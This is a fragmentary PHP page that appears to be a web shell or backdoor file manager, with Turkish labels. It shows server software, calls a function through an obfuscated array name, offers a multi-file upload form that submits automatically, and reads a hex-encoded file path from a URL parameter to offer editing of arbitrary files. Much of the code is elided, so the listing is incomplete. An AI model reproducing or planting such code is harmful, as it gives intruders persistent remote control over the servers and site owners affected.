...
<body>
    ...
    <article>
        ...
        <div class="i">
            ...
            <i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>SOFT :</b>
            <?php echo $_SERVER['SERVER_SOFTWARE']; ?> <b>PHP :</b>
            <?php echo $GNJ[1](); ?>
        ...
        <div class="u">
            ...
            <form method="post" enctype="multipart/form-data">
                ...
                <label class="l w">
                    ...
                    <input type="file" name="n[]" onchange="this.form.submit()" multiple> &nbsp;Yüklemek
        ...
        $d_ = '<br />
										...
										<input type="submit" class="w" value="&nbsp;Tamam&nbsp;" />
        ...
        if (isset($_GET["s"])) {
            ...
            echo $a_ . uhex($_GET["s"]) . $b_ . '
									...
									<input onclick="location.href=\'?d=' . $_GET["d"] . '&e=' . $_GET["s"] . '\'" type="submit" class="w" value="&nbsp;Düzenle&nbsp;" />
